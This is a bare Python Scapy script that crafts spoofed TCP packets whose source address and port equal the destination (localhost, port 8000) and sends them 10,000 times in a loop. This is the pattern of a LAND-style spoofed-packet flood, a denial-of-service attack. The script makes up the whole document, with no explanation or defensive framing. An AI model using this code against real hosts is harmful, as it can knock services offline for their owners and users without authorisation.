from scapy.all import *
target = "localhost"
port = 8000
i = IP()
i.dst = target
i.src = target
t = TCP()
t.dport = port
t.sport = port
for x in range(1, 10000):
    send(i / t)